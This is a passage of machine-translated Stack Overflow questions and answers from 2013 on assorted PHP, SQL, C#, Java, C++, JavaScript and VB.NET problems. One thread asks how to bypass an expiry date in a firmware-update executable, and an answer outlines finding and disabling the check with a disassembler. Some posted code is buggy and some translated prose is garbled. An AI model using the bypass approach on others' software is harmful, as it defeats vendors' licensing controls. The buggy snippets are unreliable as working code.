您正在做的一些事情很奇怪，在某些情况下是不正确的，请尝试这样的事情（您正在使它变得比实际更复杂）：

```
$openProduction = "<table><tbody>";
$openProduction .= "<td>productionId</td>";
$openProduction .= "<td>userID</td>";
$openProduction .= "<td>startTime</td>";
$openProduction .= "<td>endTime</td>";

while($row = mysql_fetch_assoc($result))
{
    $id = $row['ID'];
    $productionId = $row['ProductionNo']; 
    $userID = $row['UserID'];
    $startTime = $row['StartTime'];
    $endTime = $row['EndTime'];

    $openProduction .= "<tr id='row_$id'>";
         $openProduction .= "<td>$productionId</td>";
         $openProduction .= "<td>$userID</td>";
         $openProduction .= "<td>$startTime</td>";
         $openProduction .= "<td>$endTime</td>";
         $openProduction .= "<td><input type='button' id='button_$id' class='button' /></td>";
    $openProduction .= "</tr>";
}

$openProduction = ."</tbody></table>"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T23:07:40.607

好吧，如果您想以自己的方式进行操作，请查看以下代码：

```
$result = mysql_query($query) or die(mysql_error());
$num_rows = mysql_num_rows($result);

if ($num_rows > 0){
while($row = mysql_fetch_assoc($result))
    {
    $row_id=0;// This variable will denote row number. 
    $list[$row_id]['ProductionNo']=$row['ProductionNo'];
    $list[$row_id]['UserID']=$row['UserID'];
    $list[$row_id]['StartTime']=$row['StartTime'];
    $list[$row_id]['EndTime']=$row['EndTime'];
    $row_id++;
    }

$openproduction = '<table><tbody><td>';
foreach ($list as &$value) 
    {
    $openproduction .= '<tr>';
        foreach ($value as &$valueitem)
        {
        $openproduction .= '<td> '.$valueitem.'</td>';
            }
    $openproduction .= "<td><input type='button' name='$key' class='button' ></td></tr></tr>";
    }
$openproduction .= '</tbody></td></table>';
unset($valueitem);
unset($value); 
```

# sql-server-2008-r2 - 在 SQL Server 中使用带有 xquery 的 nullif() 语句会破坏 xquery 优化吗？

> ID：15443143
> 
> 赞同：1
> 
> 时间：2013-03-15T22:33:22.917
> 
> 标签：sql-server-2008-r2, query-optimization, xquery

我在 SQL Server 2008 中有以下动态 SQL 块（作为更大查询的一部分）：

```
insert into '+@schema+'.HP_Payers (HeadingID, PayerName, PayerID_Qualifier, PayerID, Address1, Address2, City, StateCode, ZipCode)
        select @headingID as HeadingID,
            nullif(c.value(''Name'', ''varchar(60)''), '''') as PayerName,
            nullif(c.value(''ID_Qualifier'', ''varchar(2)''), '''') as PayerID_Qualifier,
            nullif(c.value(''ID_Code'', ''varchar(80)''), '''') as PayerID,
            nullif(c.value(''Address1'', ''varchar(55)''), '''') as Address1,
            nullif(c.value(''Address2'', ''varchar(55)''), '''') as Address2,
            nullif(c.value(''City'', ''varchar(30)''), '''') as City,
            nullif(c.value(''StateCode'', ''char(2)''), '''') as StateCode,
            nullif(c.value(''ZipCode'', ''varchar(15)''), '''') as ZipCode
        from '+@schema+'.IntegrationQueue cross apply InputValue.nodes(''/ROOT/Payer'') t(c)
        where QueueID = @queueID 
```

它将来自'from'语句中给定节点的正确数据插入到新表中。整个查询本身运行一组 10 个 XML 文件，比我添加 nullif() 语句之前快了大约 10 秒。我还在有关 xquery 优化的 MS 文档中找到了以下信息：

*value() 方法调用必须连续出现在要合并的 SELECT 列表中。非连续 value() 方法的执行不会合并。*

所以我的问题是放置这些 nullif() 语句是否会破坏此处描述的性能提升？任何帮助，将不胜感激。

# ember.js - When my computed property is updated the linkTo attr does not get update in ember RC1

> ID：15443156
> 
> 赞同：1
> 
> 时间：2013-03-15T22:34:25.017
> 
> 标签：ember.js

Here is the linkTo helper in my handlebars template

```
{{#linkTo 'person.page' nextPage target="controller"}}Next{{/linkTo}} 
```

Here is my controller

```
PersonApp.PersonController = Ember.ArrayController.extend(Ember.PaginationMixin, {
    itemsPerPage: 2
}); 
```

Here is the computed property in the mixin

```
 nextPage: function() {

    var nextPage = this.get('currentPage') + 1;
    var availablePages = this.get('availablePages');

    if (nextPage <= availablePages) {
        return Ember.Object.create({id: nextPage});                                 
    }else{
        return Ember.Object.create({id: this.get('currentPage')});
    }   

  }.property('currentPage', 'availablePages'), 
```

when I console log just before each return statement I can see the page id is correct ... yet my html isn't updated. Anything simple that I'm doing wrong in the above?

Also I do see a print each time I change the page (so the computed properties I depend on are being fired)

Here is a full blown jsfiddle showing that after you click next the first time ... it still points at /#/page/2 instead of /#/page/3

[http://jsfiddle.net/RhTyx/2/](http://jsfiddle.net/RhTyx/2/)

Thank you in advance

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T12:47:04.223

First off: It would be nice, if you would not link a fiddle where the most important code is not part of the fiddle (the FilterSortSliceMixin). Therefore one cannot test anything, despite the fact the fiddle was really huge and contained lots of unnecessary code.

**Regarding your problem:** I think this cannot work because the dependent properties you specified do not do anything. Your {{#linkTo}} helper sends the user into the the PersonPageRoute. The code of this route is:

```
PersonApp.PersonPageRoute = Ember.Route.extend({
    model: function(params) {
        return PersonApp.Person.find(params.page_id);
    },
    setupController: function(controller, model) {
        this.controllerFor('person').set('selectedPage', model.get('id'));
    }
}); 
```

So you are getting the personcontroller and set the property `selectedPage`. But this property is not specified in your dependent keys. So therefore i would suggest this:

```
//maybe even remove currentPage??
}.property('currentPage', 'availablePages' , 'selectedPage'), 
```

So i guess you got confused with your naming. I guess, you should either have the property 'selectedPage' or 'currentPage', right?

**Update:** This is definitely a bug. Heres an excerpt from the LinkView class, which is used with the linkTo helper:

```
var LinkView = Ember.View.extend({
  attributeBindings: ['href', 'title'], 
  href: Ember.computed(function() {
      var router = this.get('router');
      return router.generate.apply(router, args(this, router));
  })
}); 
```

As you see it does not specify any dependent keys. Maybe you can reopen/patch this class and add the dependent key. Don't know which one this would have to be, but maybe `context`?

# php - 使用 PDO 替换字段中的字符

> ID：15443157
> 
> 赞同：1
> 
> 时间：2013-03-15T22:34:32.953
> 
> 标签：php, mysql, codeigniter, pdo

我有大约 9,000 行的表，我需要在其中搜索一个特定的列并用适当的替换替换特定的字符。为此，我有一个关联的值数组。下面是我的代码，它将更好地了解我想要实现的目标。我正在尝试尽可能高效地做到这一点，并且尽可能少地查询。任何帮助，将不胜感激。

```
try {
  $DBH = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
}
catch(PDOException $e) {

    die($e->getMessage());

}

$diacritics = array(
    'Š'=>'S', 'š'=>'s', 'Ð'=>'Dj', 'Ž'=>'Z', 'ž'=>'z', 'C'=>'C', 'c'=>'c', 'C'=>'C', 'c'=>'c',
    'À'=>'A', 'Á'=>'A', 'Â'=>'A', 'Ã'=>'A', 'Ä'=>'A', 'Å'=>'A', 'Æ'=>'A', 'Ç'=>'C', 'È'=>'E', 'É'=>'E',
    'Ê'=>'E', 'Ë'=>'E', 'Ì'=>'I', 'Í'=>'I', 'Î'=>'I', 'Ï'=>'I', 'Ñ'=>'N', 'Ò'=>'O', 'Ó'=>'O', 'Ô'=>'O',
    'Õ'=>'O', 'Ö'=>'O', 'Ø'=>'O', 'Ù'=>'U', 'Ú'=>'U', 'Û'=>'U', 'Ü'=>'U', 'Ý'=>'Y', 'Þ'=>'B', 'ß'=>'Ss',
    'à'=>'a', 'á'=>'a', 'â'=>'a', 'ã'=>'a', 'ä'=>'a', 'å'=>'a', 'æ'=>'a', 'ç'=>'c', 'è'=>'e', 'é'=>'e',
    'ê'=>'e', 'ë'=>'e', 'ì'=>'i', 'í'=>'i', 'î'=>'i', 'ï'=>'i', 'ð'=>'o', 'ñ'=>'n', 'ò'=>'o', 'ó'=>'o',
    'ô'=>'o', 'õ'=>'o', 'ö'=>'o', 'ø'=>'o', 'ù'=>'u', 'ú'=>'u', 'û'=>'u', 'ý'=>'y', 'ý'=>'y', 'þ'=>'b',
    'ÿ'=>'y', 'R'=>'R', 'r'=>'r'
);

$dia_remove_STH = $DBH->prepare("UPDATE mytable SET title=?"); 
//THE FOLLOWING LINE IS OBVIOUSLY NOT VALID BUT IS THE FUNCTIONALITY I'M LOOKING TO ACHIEVE
$dia_remove_STH->execute(array(strtr(mytable.title, $diacritics)); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:40:29.423

我不认为有一个简单的 SQL 解决方案可以解决这个问题，因此您应该编写一个存储过程或简单地将记录读入 PHP，进行替换然后更新记录。您可以在可以加快速度的事务中执行此操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T22:44:14.337

**编辑：** 看到你正在使用 codeigniter，用 codeigniter 数据库函数替换。

```
$query="UPDATE TABLE_NAME SET COLUMN = REPLACE(COLUMN,?,?)";
foreach($diacritics as $key=>$value){
    $params= array($key, $value);
    $this->db->query($query, $params);
} 
```

交替：

```
$query="REPLACE(COLUMN,?,?)";
$params=array();
foreach($diacritics as $key=>$value){
    $params[]= $key;
    $params[]= $value;
    $query= 'REPLACE('.$query.',?,?)';
}
$query= 'UPDATE TABLE_NAME SET COLUMN = ' . $query;
$this->db->query($query, $params); 
```

# c# - 在 KeyPress 事件中验证浮点值

> ID：15443159
> 
> 赞同：-1
> 
> 时间：2013-03-15T22:34:36.563
> 
> 标签：c#, .net, winforms, validation, keypress

当用户使用事件在控件中`float`键入内容时，我正在尝试实现一个函数来验证一个值。`TextBox``KeyPress`

**这是我尝试过的：**

```
private void ValidateFloat(object sender, KeyPressEventArgs e)
{
    int b;

    if (e.KeyChar == (char)Keys.Back ||
        e.KeyChar == (char)Keys.Delete ||
        e.KeyChar == (char)Keys.Left ||
        e.KeyChar == (char)Keys.Right ||
        int.TryParse(e.KeyChar.ToString(), out b))
    {
        TextBox obj = sender as TextBox;
        if (e.KeyChar == '.' && obj.Text.IndexOf('.') > 0)
            e.Handled = true;
        else
            e.Handled = false;
    }
    else
        e.Handled = true;
}

private void txt_KeyPress(object sender, KeyPressEventArgs e)
{
    this.ValidateFloat(sender, e);
} 
```

但是由于某种原因，这似乎有效但根本不起作用，请查看以下描述...

* * *

**第一种情况：用户输入像****20.5**这样的数值

 ****观察：**

数字中已经有一个点作为小数分隔符。因此，当尝试再次按点键放置另一个时，验证工作正常。

* * *

**第二种情况：**用户输入类似**..20.5的值**

**观察：**

第一个数字不能是数值中的点。此外，还有不止一个点，并且验证无法正常工作。

* * *

所以，我的问题是...

**如何修复上述代码以获得对`float`值的真正良好验证？**（没有“错误”）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:41:17.673

采用

```
if (e.KeyChar=='.' && (obj.Text.IndexOf('.')>0 || obj.Text.Length==0)) 
```

赶上'前导小数'。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T22:41:28.047

为什么不简单地尝试解析文本框的文本（如果需要，您可以提供数字样式和格式）？

```
private void txt_KeyPress(object sender, KeyPressEventArgs e)
{
    TextBox textbox = (TextBox)sender;
    float value;
    if (float.TryParse(textbox.Text, out value))
        // input is valid
} 
```

我相信这种对浮点值的验证没有错误。**

# c# - 网格视图的标题

> ID：15443163
> 
> 赞同：0
> 
> 时间：2013-03-15T22:34:42.593
> 
> 标签：c#

我有一个桌面应用程序，它在 Datagridview 中显示数据，但是当我单击 Datagridview 的标题时，会自动选择 Datagridview 中的第一个单元格。如何删除gridview中单元格的自动选择？

```
 private void GV_investigate_CellClick(object sender, DataGridViewCellEventArgs e)
    {
        if (GV_investigate.SelectedRows.Count > 0)
        {
            int oid = int.Parse(GV_investigate.SelectedRows[0].Cells[0].Value.ToString());
        }
    }

   private void GV_investigate_DataBindingComplete(object sender, DataGridViewBindingCompleteEventArgs e)
    {
        GV_investigate.ClearSelection();
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:14:05.823

如果您想在 oid 中获取选定的单元格值，那么您应该执行类似的操作。在单元格点击事件中，如果你不使用 try，在你的编码中捕获你有时会出错

```
private void GV_investigate_CellClick(object sender, DataGridViewCellEventArgs e)
{
    try
    {
        int oid = int.Parse(GV_investigate.Rows[e.RowIndex].Cells[0].Value.ToString());                
    }
    catch (Exception)
    {
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:37:13.190

你能试试这个吗？

dataGridView.CurrentCell = null;

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T22:58:20.207

`datagridview`有一个名为`ColumnHeaderMouseClick`将此事件添加到您的项目的事件，然后当用户单击列标题时，该事件在函数中调用它的函数，我们只需清除选择：

向项目添加事件：

```
 public Form1()
    {
        InitializeComponent();
        dataGridView1.ColumnHeaderMouseClick += dataGridView1_ColumnHeaderMouseClick;
    } 
```

事件处理程序：

```
 private void dataGridView1_ColumnHeaderMouseClick(object sender, DataGridViewCellMouseEventArgs e)
    {
        dataGridView1.ClearSelection();
    } 
```

# java - 地理工具阅读器

> ID：15443165
> 
> 赞同：2
> 
> 时间：2013-03-15T22:34:46.183
> 
> 标签：java, tiff, raster, geotools

当我尝试从 AbstractGridCoverage2DReader 获取对象时遇到问题。我需要它来获得 CoordinateReferenceSystem 和覆盖范围。

```
File file = new File("Resource/new.tif");

AbstractGridFormat format = GridFormatFinder.findFormat(file);
System.out.println("here we have format: "+format);

AbstractGridCoverage2DReader reader = format.getReader(file);
System.out.println("here we have reader: "+reader); 
```

格式没问题：“org.geotools.gce.geotiff.GeoTiffFormat@ed5ad5d”。但是 reader 始终为 NULL。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T11:37:46.130

好的，我解决了，更改 pom.xml 文件（我有一个基于 maven 的项目）。

(1): org.geotools gt-epsg-hsql ${geotools.version}

(2): org.geotools gt-epsg-hsql 2.7-M2

我在 (2) 上更改了 (1) 并且效果很好！:)。

# java - 从文本文件创建 JSONObject

> ID：15443166
> 
> 赞同：0
> 
> 时间：2013-03-15T22:34:53.830
> 
> 标签：java, android, json

我正在尝试在 Android 应用程序中读取文本文件并创建 JSONObject，但是在将文本文件读入字符串后，当我尝试使用该字符串构造 JSONObject 时抛出 JSONException。

这是我正在使用的代码：

```
InputStream is = this.getResources().openRawResource(R.raw.quiz);
    BufferedReader reader = new BufferedReader(new InputStreamReader(is)); 
    String jsString = "";
    String line = null;
    while((line = reader.readLine()) != null){
        jsString += line;
    }
    is.close();
    reader.close();

    try {
        return new JSONObject(jsString);
    } catch (JSONException e) {

    }
    return null; 
```

这是我正在阅读的文本文件 quiz.txt：

```
{"length":3,"questions":[{"questionText":"Is mayonaise an instrument?","answers":["Yes","no","no","no","no"],"correctAnswer":0},{"questionText":"10^2","answers":["1","10","100","1000","over 9000"],"correctAnswer":1},{"questionText":"Dogs Name?","answers":["Barky","Steve","Rex","Daisy","Wormy"],"correctAnswer":3}]} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:55:51.060

尝试使用此方法将文件内容读入字符串。

```
 public static String getJsonFromResource( int resource, Context context ) {

        InputStream inputStream = context.getResources().openRawResource( resource );
        BufferedReader r = new BufferedReader( new InputStreamReader( inputStream ) );
        StringBuilder stringBuilder = new StringBuilder();
        String line;
        String jsonString = null;
        try {
            while (( line = r.readLine() ) != null) {

                stringBuilder.append( line );
            }
            jsonString = stringBuilder.toString();
        }
        catch (Exception e) {
            Log.e( "GetJsonFromResource", Log.getStackTraceString( e ) );
        }
        return jsonString;
    } 
```

# c++ - _tprintf 在控制台应用程序中使用 Unicode 字符

> ID：15443168
> 
> 赞同：7
> 
> 时间：2013-03-15T22:35:12.533
> 
> 标签：c++, winapi, unicode, console-application

我正在从 Unicode 构建的控制台应用程序（使用 C++ 和 Visual Studio 2008）做这个简单的输出。此代码旨在在 Windows 上运行：

```
_tprintf(L"Some sample string\n"); 
```

一切正常。但是，如果我在其中添加一个非 ASCII 字符：

```
_tprintf(L"Some sample € string\n"); 
```

输出到控制台的是该字符之前的所有内容：

> 一些样品

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-16T14:07:47.470

默认情况下，Windows 控制台不处理宽字符。启用该功能的最简单方法可能是调用`_setmode`：

```
_setmode(_fileno(stdout), _O_WTEXT); 
```

有关所需的包含、使用示例和其他可用模式，请参阅[MSDN 。](http://msdn.microsoft.com/en-us/library/tw4k6df8.aspx)

# sql - 从 MS SQL 导出到 CSV 并保留回车/换行/制表符

> ID：15443171
> 
> 赞同：0
> 
> 时间：2013-03-15T22:35:25.097
> 
> 标签：sql, csv, export-to-csv

我的一个表中有一个字段，其中包含回车符、换行符和制表符。我需要能够将此字段导出到 csv 文件中，同时保持回车、换行和制表符的格式。

如果我进行常规导出，csv 文件会将所有回车符、换行符和制表符视为一个新单元格，并在新单元格中输入数据。我需要把所有这些都放在一个牢房里。那可能吗？

我正在运行 sql server 2012 express。提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T22:45:44.483

您的 .csv 文件是否必须以标准方式分隔？如果它不必采用标准方式并且您可以选择任何分隔符，那么您应该能够创建一个 SELECT 语句来将选定的分隔符/换行符包装在您的数据周围。然后将结果导出为 .csv 格式。

# dll - 可移植的可执行 DLL 文件和二进制日期格式

> ID：15443174
> 
> 赞同：0
> 
> 时间：2013-03-15T22:35:40.663
> 
> 标签：dll, date-format, portable-executable, hexdump

我有一个 PE 可执行文件 *.exe（32 位），它是一个小应用程序（2.6Mb），用于更新电视设备的固件软件。但是，更新机制仅在 2013-03-12 之前可用。我想破解这个可执行文件只是为了好玩。我正在尝试使用 PE Explorer 在文件 hexdump 中找到此到期日期，并在将来将其替换为某个日期以使该程序正常工作。

我发现这篇关于二进制日期格式的文章：

[二进制日期格式](https://stackoverflow.com/questions/277660/seen-this-binary-date-format)

我试图找到类似这个值的东西：

2013-03-xx：0x713xxxx

这是解决我的任务的好方法吗？有什么建议么？你知道任何其他可能有用的 hexdump 工具吗？

最好的尊重，WP

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T22:48:45.933

可能有很多 0x713xxxxxx 形式的值——当您开始或多或少地随机查看时，2.6 MB 可能比您想象的要大（您实际上并不知道应用程序在内部使用这种日期格式） .

处理此类问题的常规方法是使用工具单步执行程序，检查正在执行的代码，直到找到发生检查的点。然后简单地禁用检查，使其始终失败——通过更改日期，或简单地更改代码。

用于单步执行您无法控制的代码的流行工具是 Interactive Dissassembler，IDA。您可以在这里下载它的免费软件版本：[https ://www.hex-rays.com/products/ida/support/download_freeware.shtml](https://www.hex-rays.com/products/ida/support/download_freeware.shtml)

做你想做的事可能比你想象的要难，但你几乎肯定会通过尝试学到很多东西。

请注意通过修改其他人的二进制文件可能会遇到的法律问题，尤其是在您之后分发它们时。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T22:39:30.533

[dumpbin](http://support.microsoft.com/kb/177429)是一个很好的 PE 解析器（但如果我是你，我不会做这种时间戳黑客 :)）

# java - Java 绘制形状错误

> ID：15443175
> 
> 赞同：1
> 
> 时间：2013-03-15T22:35:54.660
> 
> 标签：java, applet

我必须使用小程序编写一个程序，它应该有 3 个按钮线、矩形、圆形。单击它们后，应绘制所需的形状。

我编写了以下代码，但显示图形未初始化的错误。现在做什么？

```
import java.applet.*;
import java.awt.*;
import java.awt.event.*;
public class Drawshapes extends Applet implements ActionListener
{

    Button line,rect,circle;
    public void init()
    {

        line=new Button("Line");

        rect=new Button("Rectangle");
        circle=new Button("Circle");

        add(line);
        add(circle);
        add(rect);

        line.addActionListener(this);
        rect.addActionListener(this);
        circle.addActionListener(this);
    }

    public void paint(Graphics g)
    {
    }

    public void actionPerformed(ActionEvent ae)
    {

        Graphics g;
        if(ae.getSource()==line)
        {
            g.drawLine(0,100,100,10);
        }
        else if(ae.getSource()==rect)
            {
                g.drawRect(10,10,60,50);
            }
        else
        {
                g.drawOval(10,10,50,50);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T22:40:47.290

与所有局部变量一样，`Graphics` `g`需要初始化。但是，从那里进行自定义绘画`ActionListener`是一个坏主意。`Graphics`在方法中使用`paint`已正确实例化的对象。

在 中设置一个标志，`ActionListener`然后调用`repaint`：

例如在`ActionListener`for 行中：

```
drawLine = true;
repaint(); 
```

*画：*

```
@Override
public void paint(Graphics g) {
   super.paint(g);
   if (drawLine) {
      g.drawLine(0, 100, 100, 10);
   } else if (drawRect) {
      g.drawRect(10, 10, 60, 50);
   } else {
      g.drawOval(10, 10, 50, 50);
   }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-15T22:38:52.563

您没有初始化您的`Graphics`参考。你可以通过调用继承自的[`getGraphics()`](http://docs.oracle.com/javase/7/docs/api/java/awt/Component.html#getGraphics%28%29)方法来初始化它。`Applet``Component`

```
Graphics g = getGraphics(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T22:42:15.623

您正在调用`g`未初始化的方法，因为您的错误说：您只声明了它。

**编辑：**正如其他人所说，您的`Graphics`对象是 的成员`Applet`，并且可以从方法访问`getGraphics`。因此，您可以在每次需要时调用此方法，或者在您的`DrawShapes`类中创建一个成员。

```
Graphics g = getGraphics();
public void actionPerformed(ActionEvent ae)
{
    if(ae.getSource()==line)
    {
        g.drawLine(0,100,100,10);
    }
    // etc
} 
```

# c++ - 使用 BOOST_GEOMETRY_REGISTER_RING

> ID：15443179
> 
> 赞同：1
> 
> 时间：2013-03-15T22:36:15.013
> 
> 标签：c++, boost-geometry

我很难理解如何将我自己的类型注册为`boost::geometry::model::ring`. 我有自己的点课：

```
struct Point { double x, y; }; 
```

并且环存储为`std::vector<Point>`. 因此，我这样注册它们：

```
BOOST_GEOMETRY_REGISTER_POINT_2D(Point , double, cs::cartesian, x, y);
BOOST_GEOMETRY_REGISTER_RING(std::vector<Point>); 
```

现在我想纠正一个环的方向，事实上，以下编译：

```
void foo(std::vector<Point>& ring) {
  boost::geometry::correct(ring);
} 
```

麻烦的是，如何定义环的“正确”方向？使用时更明显`boost::geometry::model::polygon`，模板参数允许我指定预期的方向。但是，以下内容无法编译：

```
void foo(std::vector<Point>& ring) {
    typedef boost::geometry::model::polygon<vector> clockwise_closed_polygon;
    clockwise_closed_polygon cwcp;
    boost::geometry::exterior_ring(cwcp) = ring; //<<< fails to compile
    boost::geometry::correct(cwcp);
} 
```

显然，我自己的环类型无法转换为`clockwise_closed_polygon`.

所以我有两个问题：

1.  如何指定正确的环方向？
2.  如上所述，为什么我的环类型不能与多边形一起使用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:53:38.520

> 麻烦的是，如何定义环的“正确”方向？

您可以尝试专门[化 boost::geometry::point_order](http://www.boost.org/doc/libs/1_53_0/libs/geometry/doc/html/geometry/reference/core/point_order.html)：

[现场演示](http://coliru.stacked-crooked.com/a/a68bd518533defc6)

```
#include <boost/geometry/geometries/register/point.hpp>
#include <boost/geometry/geometries/register/ring.hpp>
#include <boost/geometry/geometries/geometries.hpp> 
#include <boost/geometry/core/point_order.hpp> 
#include <boost/geometry.hpp>
#include <iostream>
#include <ostream>
#include <vector>

using namespace boost::geometry;
using namespace std;

struct Point { double x, y; };

BOOST_GEOMETRY_REGISTER_POINT_2D(Point , double, cs::cartesian, x, y)
BOOST_GEOMETRY_REGISTER_RING(vector<Point>)

namespace boost { namespace geometry
{
   template<>
   struct point_order<vector<Point>>
   {
      //static const order_selector value=counterclockwise;
      static const order_selector value=clockwise;
   };
}}

template<typename Ring>
void print(const Ring &r)
{
   for(auto p : r)
      cout << "(" << p.x << "," << p.y << ")";
   cout << endl;
}

int main()
{
   std::vector<Point> ring{{0.0,0.0},{1.0,0.0},{0.0,1.0},{0.0,0.0}};
   print(ring);
   correct(ring);
   print(ring);
} 
```

输出是：

```
(0,0)(1,0)(0,1)(0,0)
(0,0)(0,1)(1,0)(0,0) 
```

如果从顺时针变为逆时针，则输出为：

```
(0,0)(1,0)(0,1)(0,0)
(0,0)(1,0)(0,1)(0,0) 
```

# javascript - 将表单上的 javascript 验证更改为 onblur 或 onchange 而不是提交

> ID：15443180
> 
> 赞同：1
> 
> 时间：2013-03-15T22:36:17.927
> 
> 标签：javascript, jquery, html, forms, validation

我有一个验证 php 和 javascript 的表单。

我想将javascript验证更改为实时。我已经设置好了，所以如果用户在单击提交按钮后输入正确的信息或不正确的信息，则会添加类和消息。这是我使用了一段时间的验证，并希望更新为实时验证。我试图将 onblur(myFunction) 等添加到具有相应功能的输入字段中。这似乎不起作用。我是一个 JavaScript 菜鸟。我意识到脚本需要进行相当多的大修，但是有人可以指出我正确的方向。我意识到有一个 jquery 插件可以做到这一点，但是我想了解它是如何发生的，而不是使用现有的代码。

```
 $(function () {
        $('#contact_form').submit(function(e) {
            e.preventDefault();
            var form = $(this);
            var post_url = form.attr('action');
            var post_data = form.serialize();
            var submit_form = false;

            *validation here*

            if (pcount == 0 && pcount2 == 0 && pcount3 == 0) {
                submit_form = true;
            }

            if (submit_form) {
                $('#loader', form).html('<img src="assets/img/loader.gif" /> Please Wait...');
                $.ajax({
                    type : 'POST',
                    url : post_url,
                    data : post_data,
                    success : function(msg) {
                        $(form).fadeOut(500, function() {
                            form.html(msg).fadeIn();
                        });
                    }
                });
            }
        });

    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T22:46:41.933

这并不难，只需像这样将发送和验证分开：

```
$.fn.validateMyForm = function() {
    var form = $(this);
    /* validation */
    if (pcount == 0 && pcount2 == 0 && pcount3 == 0) {
        return true;
    }
    return false;
}

$(function () {
    $('#contact_form').submit(function(e) {
        e.preventDefault();
        var form = $(this);
        var post_url = form.attr('action');
        var post_data = form.serialize();
        if ($(form).validateMyForm()) {
            /* ajax sending */
        });
    }
}); 
```

然后在需要的地方添加对模糊事件的验证：

```
$("input").blur({
    $('#contact_form').validateMyForm();
}); 
```

# jquery - Stackblur - 一个非常基本的难度

> ID：15443181
> 
> 赞同：0
> 
> 时间：2013-03-15T22:36:20.113
> 
> 标签：jquery, canvas

我提前道歉问什么似乎是一个非常基本的问题，但我似乎无法在任何地方找到解决方案。

我正在尝试遵循[stackblur 演示中的建议和源代码，并尝试在](http://www.quasimondo.com/StackBlurForCanvas/StackBlurDemo.html)[此 jsFiddle](http://jsfiddle.net/8QeAQ/1/)上进行基本实现

HTML 是：

```
<img id="imgsrc" src="http://benjaminelwyn.com/onelostglove/photos/glove-75.jpg">

<canvas id="canvas"></canvas> 
```

JS是：

```
stackBlurImage( 'imgsrc', 'canvas', 20, false ); 
```

我遇到的错误与我在自己的网站上遇到的错误相同。它说它“无法访问本地文件”。显然我没有在这里做某事，但我不知道是什么。

任何帮助我走上我的路将不胜感激。

非常感谢！

b

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-04T14:53:50.890

我在运行应用程序时使用`localhost`而不是，现在它工作正常。`file:///`

# vb.net - 发件人和 MessageBox 的奇怪之处

> ID：15443182
> 
> 赞同：1
> 
> 时间：2013-03-15T22:36:24.270
> 
> 标签：vb.net

这里有新海报和各种 VB hack。

我有一个包含一个图片框和三个文本框的 Windows 窗体。三个文本框（红色、绿色、蓝色）用于输入 000 到 255 之间的数值，表示颜色代码。PictureBox 将显示来自三个 TextBox 值的结果颜色。

我的验证例程 ValidDecCode 确保输入的值在允许的范围内 (000-255)。

如果用户在第一个位置输入“2”，则一切正常。如果用户随后在第二个位置输入“6”，它将无法通过我的验证测试。

输入 KeyDown 事件后，我保存 sender.selectionstart 和 sender.text 值。输入“6”后，selectionstart 将为 1，文本包含已验证的数据“2”。

一旦“6”未通过验证测试，我将显示一个 MessageBox，重新加载我保存的发件人数据、文本和 selectionstart。这会将表单返回到输入“6”之前的状态。文本框将显示一个“2”，光标位于“2”之后。

我觉得奇怪的是，如果我注释掉 MessageBox.Show() 行，TextBox 将在验证失败后显示“26”。如果我注释掉重新加载我的发件人数据而不是 MessageBox.Show() 行，则 TextBox 将显示“26”。

我想知道为什么注释掉 MessageBox.Show() 行不会在输入无效数据之前将表单返回到其状态，我该怎么办。调用 MessageBox 使其工作有什么意义？

```
Private Sub RedBox_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) _
    Handles RedBox.KeyDown, GreenBox.KeyDown, BlueBox.KeyDown

    Dim InChr As String
    Dim InPos As Integer = sender.selectionstart
    Dim InText As String = sender.text

    If IsNumeric(Chr(e.KeyCode)) Then
        InChr = Chr(e.KeyValue)
            If Not ValidDecCode(InText + InChr, InPos) Then
                MessageBox.Show("Invalid value")
                sender.text = InText
                sender.selectionstart = InPos
            End If
    Else
        MessageBox.Show("Invalid value")
        sender.Text = InText
        sender.selectionstart = InPos
        Exit Sub
    End If
End Sub 
```

# vb.net - 自定义延迟加载开放存取 ORM

> ID：15443185
> 
> 赞同：-2
> 
> 时间：2013-03-15T22:36:53.547
> 
> 标签：vb.net, telerik-open-access

我正在使用开放访问 orm，我需要一种简单的方法来获取父实体信息并自定义加载相关子信息。我的意思是当我要求订单时，我只想要订单信息并且能够加载或不加载订单信息。

如果我有：

```
Public Class Order
Public Property Number As Long
Public Property Description As String
Public Property OrderLines as List(of OrderLines) = new List(of OrderLines)
End Class 
```

如果我愿意，我该怎么办，例如：

```
Dim e as new EntitiesModel()
Dim q as Order = (from c in e.Orders
                 where c.Number = 5
                 select c).FirstOrDefault() 
```

而且我需要该查询只是为了检索订单数据而不是 OrderLines，这似乎是 OA 默认执行的操作。

编辑：我已经尝试过这个：

```
 Using dbcontext As New EntitiesModel()
            Dim fetchStrategy As New FetchStrategy()
            dbcontext.FetchStrategy = fetchStrategy
            Dim q As Order
            q = (From c In dbcontext.Orders
                Where c.PK_Order = 79
                Select c).FirstOrDefault
            For Each olFound In q.OrderLines
                Dim i As Integer
                Console.WriteLN(olFound.Description&VbNewLine)
            Next
        End Using 
```

我仍在接收 OrderLines 数据，我并不总是需要该数据。telerik 的大多数示例都将加载相关数据，但我想要相反。有没有办法指定我是否想要这样做？我希望清楚：/

